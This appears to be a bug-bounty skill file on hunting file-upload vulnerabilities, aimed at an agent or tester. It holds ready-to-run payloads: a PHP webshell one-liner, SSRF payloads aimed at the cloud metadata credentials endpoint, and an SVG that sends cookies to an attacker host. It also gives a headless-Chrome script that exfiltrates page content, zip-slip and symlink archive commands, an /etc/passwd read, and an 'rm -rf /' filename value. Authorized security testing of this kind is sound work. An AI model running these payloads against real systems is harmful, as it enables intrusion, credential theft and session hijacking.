---
name: hunt-file-upload
description: "Hunt file upload bugs — RCE via webshell, XSS via SVG/HTML, SSRF via XXE in DOCX, path traversal via filename. Bypass tables (10 techniques): double extension (shell.php.jpg if server checks last ext only), magic bytes spoofing (PNG header on PHP), null byte (shell.php\0.jpg), case (PHP, .Php, .pHP), .htaccess upload to enable execution, SVG with <script>, HTML/SVG XSS, DOCX with embedded XXE, ZIP slip (../../../etc/passwd in archive), polyglot files. Detection: any /upload, /avatar, /profile-picture, /attachment, /import endpoint. Test: upload PHP/JSP/ASPX shells, request via direct URL, check response. Validate: actual code execution (whoami output) for RCE; reflected XSS in profile-photo URL. Use when testing file upload features, avatar/attachment endpoints, import/export functions, XML/DOCX/ZIP processors. Real paid examples."
sources: field_recon, hackerone_public, web_security
report_count: 12
---

## Content-Type & Extension Bypass

### Upload Trust Model

Every upload feature has four separate trust boundaries — test each independently:

1. **Accept** — validation before storage (extension, MIME, magic bytes)
2. **Store** — where written, under what name, with what permissions
3. **Process** — background tools: converters, scanners, parsers, extractors
4. **Serve** — download/render/transform, CDN or direct, inline vs attachment

Bugs usually appear in a different stage than where the file was uploaded.

### Recon Questions (Answer Before Payload Selection)

- Which extensions are allowed, denied, or normalized?
- Does the backend trust extension, MIME type, magic bytes, or all three?
- Is the file renamed, transcoded, unzipped, scanned, or re-hosted?
- Is retrieval direct, proxied, signed, or served from a CDN?
- Can one user predict or overwrite another user's file path?
- Do filenames, metadata, or previews reflect back into HTML, logs, or PDFs?

### Content-Type Bypass
```
filename=shell.php, Content-Type: image/jpeg  → server trusts Content-Type
filename=shell.phtml, shell.pHp, shell.php5   → extension variants
```

### File Upload Bypass Techniques (10 techniques)

| Attack | How | Prevention |
|---|---|---|
| Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5` | Allowlist + extract final extension |
| Null byte | `shell.php%00.jpg` | Sanitize null bytes |
| Double extension | `shell.jpg.php` | Only allow single extension |
| MIME spoof | Content-Type: image/jpeg with .php body | Validate magic bytes, not MIME header |
| Magic bytes prefix | Prepend `GIF89a;` to PHP code | Parse whole file, not just header |
| Polyglot | Valid as JPEG and PHP | Process as image lib, reject if invalid |
| SVG JavaScript | `<svg onload="...">` | Sanitize SVG or disallow entirely |
| XXE in DOCX | Malicious XML in Office ZIP | Disable external entities |
| ZIP slip | `../../../etc/passwd` in archive | Validate extracted paths |
| Filename injection | `; rm -rf /` in filename | Sanitize + use UUID names |

### Magic Bytes Reference

| Type | Hex |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

### Rich Text Editor Path Matrix

| Editor | Upload Path | Version Indicator |
|---|---|---|
| FCKeditor | `/fckeditor/editor/filemanager/connectors/` | `/fckeditor/_whatsnew.html` |
| CKEditor | `/ckeditor/` | `/ckeditor/CHANGES.md` |
| eWebEditor | `/ewebeditor/` | Admin: `/ewebeditor/admin_login.asp` |
| KindEditor | `/kindeditor/attached/` | `/kindeditor/kindeditor.js` |
| UEditor | `/ueditor/net/` or `/ueditor/php/` | `/ueditor/ueditor.config.js` |

### Validation Defect Taxonomy

| Dimension | Flaw Examples |
|---|---|
| **Location** | Client-side only, inconsistent front/back |
| **Method** | Extension blacklist (incomplete), MIME check only, magic bytes only |
| **Logic order** | Renames AFTER execution check, validates BEFORE full upload |
| **Scope** | Checks filename but not file content, checks first bytes only |
| **Execution context** | Upload succeeds but different vhost/handler processes the file |

### Response Manipulation Bypass

If the server returns `allowedTypes` in the response for client-side validation, intercept the response, modify `allowedTypes` to include `.php`, and forward — the server trusts client-side filtering and never re-validates.

### Stored XSS via SVG
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

---

## ImageMagick / FFmpeg Exploitation

### ImageMagick SSRF / File Read (ImageTragick family + modern variants)
```bash
# Upload this as a .mvg or rename to .jpg/.png (magic bytes bypass)
# MVG SSRF payload — fetches internal URL during processing
cat > /tmp/ssrf.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
pop graphic-context
EOF

# SVG SSRF (ImageMagick processes SVG remotely)
cat > /tmp/ssrf.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://COLLAB_HOST/imagemagick-ssrf" width="200" height="200"/>
</svg>
EOF

# WebP/AVIF processing bugs (modern surface — CVE-2023-4863)
# Upload a crafted WebP file targeting libwebp heap overflow
# Use: https://github.com/mistymntncop/CVE-2023-4863 PoC
```

### FFmpeg SSRF via HLS Playlist
```bash
# FFmpeg processes m3u8 playlists and fetches referenced segments
cat > /tmp/ssrf.m3u8 << 'EOF'
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
EOF

# Also works with concat demuxer
cat > /tmp/concat.txt << 'EOF'
ffconcat version 1.0
file 'http://COLLAB_HOST/ffmpeg-ssrf'
EOF

# Test: upload .m3u8 or video file to any video processing endpoint
```

---

## Headless Chrome / PDF Generator SSRF

### HTML → PDF Converter Attacks
```bash
# Target: invoice generators, report exporters, screenshot services
# Inject HTML that causes headless Chrome to fetch internal resources

# SSRF via CSS import
PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'

# SSRF via HTML iframe
PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'

# Local file read
PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'

# JavaScript execution (if sandbox not enforced)
PAYLOAD='<html><body><script>
fetch("http://COLLAB_HOST/chrome-rce?d=" + encodeURIComponent(document.documentElement.innerHTML));
</script></body></html>'

# Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
curl -s -X POST "https://$TARGET/api/generate-pdf" \
  -H "Content-Type: application/json" \
  -d "{\"html\": \"$PAYLOAD\"}"
```

---

## Archive Extraction Attacks (Zip Slip / Symlink)

```bash
# Zip Slip — path traversal via archive filenames
pip3 install evilarc
python3 evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5 -f /tmp/zipslip.zip

# Symlink attack — archive contains symlink to sensitive file
mkdir -p /tmp/sym_attack
ln -s /etc/passwd /tmp/sym_attack/innocent.txt
zip -ry /tmp/symlink.zip /tmp/sym_attack/

# TAR symlink attack
tar --create --file=/tmp/symlink.tar --dereference /tmp/sym_attack/

# Test: upload to any /import, /extract, /unzip endpoint
curl -s -X POST "https://$TARGET/api/import" \
  -F "file=@/tmp/zipslip.zip"
```

---

## Storage, Retrieval & Authorization Abuse

### Predictable or Controllable Paths

Patterns to look for: `/uploads/USER_ID/avatar.png`, `/files/org-slug/report.pdf`, `/cdn/tmp/<uuid>/<filename>`. Test for: cross-tenant read by guessing IDs/slugs/UUIDs, overwrite by reusing another user's filename, path normalization bugs in filename or archive members, and private files exposed through direct object URLs despite UI-level access control.

### Filename Injection Surfaces

A safe file becomes dangerous if the **filename** is reflected into gallery HTML, admin moderation panels, PDF/CSV exports, logs, audit views, or email notifications. Treat reflected filenames as stored input.

### Authorization Checks

Upload features frequently hide non-parser bugs:
- Upload quota enforced in UI but not API
- Plan restrictions checked on upload page but not on import endpoint
- File ownership checked on list view but not on direct download or replace endpoint
- Approval workflow bypassed by calling the final storage endpoint directly
- Delete or replace action missing object-level authorization

When the upload path includes account/project/org identifiers, always run an A/B authorization test.

## Test Sequence

1. Upload one benign marker file and map rename, path, and retrieval behavior.
2. Try one validation-bypass sample and one active-content sample.
3. Check whether retrieval is attachment, inline render, transformed preview, or background processing.
4. If processing exists, pivot by processor family: XSS, XXE, CMDi, zip slip, or SSRF.
5. Run tenant-boundary and overwrite tests on file IDs, replace endpoints, and public URLs.

## Related Skills & Chains

- **`hunt-rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
- **`hunt-xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
- **`hunt-xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
- **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
- **`security-arsenal`** — Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
- **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.

### Phase X — Processing Race & CDN Cache Poisoning

Processing race: upload benign file → processor validates OK → attacker overwrites with malicious file before serving.
CDN cache poisoning via upload headers: force `Cache-Control: public, max-age=31536000` + `Content-Type: text/html` on an uploaded image.
Zip Slip: create archive with `../../../var/www/html/shell.php` path traversal entry.
